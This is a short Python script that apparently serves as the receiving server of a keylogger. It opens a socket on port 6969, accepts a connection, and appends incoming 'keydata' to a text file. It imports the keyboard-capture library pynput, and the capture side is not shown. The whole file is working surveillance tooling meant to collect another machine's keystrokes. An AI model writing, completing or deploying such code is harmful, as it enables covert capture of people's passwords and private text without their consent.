import socket
import pynput


# connecting
def main():
    # makes a socket and bind
    with socket.socket() as s:
        s.bind(("127.0.1.1", 6969))
        s.listen()
        print("|SERVER STARTS|")
        conn, addr = s.accept()

        # connecting with the conn
        with conn:
            print(f"|CONNECTED| with {addr}")
            while True:
                # receive the data and decode
                keydata = conn.recv(1024).decode()

                # write the decoded data in a file
                with open("loggedtext.txt", "a") as f:
                    f.write(keydata)
                # breaks if theres no data
                if not keydata:
                    break


# main
if __name__ == "__main__":
    main()
